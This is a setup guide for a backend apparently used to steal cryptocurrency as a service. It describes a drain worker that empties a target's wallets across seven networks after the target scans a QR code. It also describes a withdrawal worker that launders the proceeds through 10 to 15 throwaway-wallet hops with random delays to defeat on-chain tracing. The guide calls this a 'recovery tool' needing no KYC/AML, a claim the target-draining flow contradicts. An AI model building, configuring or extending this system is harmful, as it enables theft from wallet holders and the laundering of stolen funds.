# Drain SaaS Backend - Setup Guide

## 🚀 Quick Start

### 1. Install Dependencies

```bash
npm install
```

### 2. Generate Encryption Keys

```bash
# Generate 32-byte encryption key
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"

# Generate master wallet seed (12 words)
node -e "console.log(require('bip39').generateMnemonic())"
```

### 3. Configure Environment

```bash
cp .env.example .env
```

Edit `.env` and add:
- `ENCRYPTION_KEY` (from step 2)
- `MASTER_WALLET_SEED` (from step 2)
- `JWT_SECRET` (random 32+ character string)
- Database URL (Coolify Postgres)
- RPC endpoints (Alchemy, etc.)

### 4. Setup Database

```bash
# Generate Prisma client
npm run prisma:generate

# Run migrations
npm run prisma:migrate

# (Optional) Open Prisma Studio to view data
npm run prisma:studio
```

### 5. Start All Services

```bash
npm run dev:all
```

This starts:
- API server (port 3001)
- Drain worker
- Withdrawal/mixing worker

---

## 📡 API Endpoints

### Authentication

**Register**:
```bash
POST /api/auth/register
{
  "email": "user@example.com",
  "password": "secure_password",
  "name": "John Doe"
}
```

**Login**:
```bash
POST /api/auth/login
{
  "email": "user@example.com",
  "password": "secure_password"
}
```

**Get Profile**:
```bash
GET /api/auth/me
Headers: { "Authorization": "Bearer <token>" }
```

### Assets

**View Held Assets**:
```bash
GET /api/assets/held
Headers: { "Authorization": "Bearer <token>" }
```

**View Assets by Network**:
```bash
GET /api/assets/held/ethereum
Headers: { "Authorization": "Bearer <token>" }
```

### Withdrawals

**Request Withdrawal (with 10-15 hop mixing)**:
```bash
POST /api/withdraw/request
Headers: { "Authorization": "Bearer <token>" }
{
  "network": "ethereum",
  "assetAddress": "0xA0b86...",
  "symbol": "USDC",
  "amount": "1000.50",
  "destinationAddress": "0x...",
  "hops": 12  // Optional: override default 10-15 range
}
```

**Check Withdrawal Status**:
```bash
GET /api/withdraw/:requestId
Headers: { "Authorization": "Bearer <token>" }
```

**Withdrawal History**:
```bash
GET /api/withdraw
Headers: { "Authorization": "Bearer <token>" }
```

---

## 🔐 Security Features

### Multi-Network Custody Wallets
Each user automatically gets custodial wallets on:
- Ethereum
- Polygon
- BSC
- Arbitrum
- Optimism
- Avalanche
- Solana

### 10-15 Hop Mixing
- Random number of hops (10-15) per withdrawal
- Random delays between hops (30s - 5min)
- Ephemeral wallets (created → used once → burned)
- Breaks on-chain analysis

### Key Management
- Master seed for deterministic wallet generation (BIP44)
- AES-256-GCM encryption for private keys
- User-specific salts
- Keys never stored in plaintext

---

## 🏗️ Architecture

```
User Registration
├─ Creates user account
├─ Generates 7 custodial wallets (one per network)
└─ Encrypts & stores private keys

Drain Flow
├─ Target scans wallet QR code
├─ System detects assets on all networks
├─ Drains to user's custodial wallets (not direct to user)
├─ Records all assets in database
└─ User sees held assets in dashboard

Withdrawal Flow (10-15 Hops)
├─ User requests withdrawal
├─ System creates 10-15 ephemeral wallets
├─ Builds hop chain: custody → eph1 → eph2 → ... → destination
├─ Executes transfers with random delays
├─ Burns ephemeral wallets after use
└─ Completes withdrawal with full privacy
```

---

## 📊 Database Schema

- **users** - User accounts
- **custodial_wallets** - User's custody wallets per network
- **held_assets** - Assets currently in custody
- **withdrawal_requests** - Withdrawal jobs
- **mixing_hops** - Individual hops in withdrawal chain
- **ephemeral_wallets** - One-time-use wallets for mixing
- **drain_history** - All drain operations

---

## 🛠️ Development

### Run Individually

```bash
# API only
npm run dev

# Drain worker only
npm run dev:worker

# Withdrawal worker only
npm run dev:withdrawal
```

### View Database

```bash
npm run prisma:studio
```

### View Logs

Logs are written to:
- `logs/error.log` (errors only)
- `logs/combined.log` (all logs)
- Console (colored output)

---

## ⚠️ Important Notes

### For Internal Use Only
- This is a security/recovery tool, not a public service
- No KYC/AML required for internal tools
- Still follows best security practices

### Key Security
- **NEVER** commit `.env` to git
- Store `MASTER_WALLET_SEED` in secure location (password manager)
- Backup database regularly
- Consider using HSM in production (AWS KMS, etc.)

### Gas Costs
- Each withdrawal = 10-15 on-chain transactions
- Estimate ~0.05 ETH per full withdrawal on Ethereum
- Much cheaper on L2s (Polygon, Arbitrum)

---

## 🔄 Migration from Old System

The existing drain flow still works! Just add userId to drain requests:

```bash
POST /api/drain/request
{
  "userId": "<user_id>",  # NEW: route to custody wallets
  "network": "ethereum",
  "sourceAddress": "0x...",
  "destinationAddress": "<custody_wallet_address>",  # NEW: custody, not user wallet
  "assets": "all",
  "privateKey": "0x..."
}
```

Worker automatically records drained assets in `held_assets` table.

---

For questions or issues, check logs or open an issue!
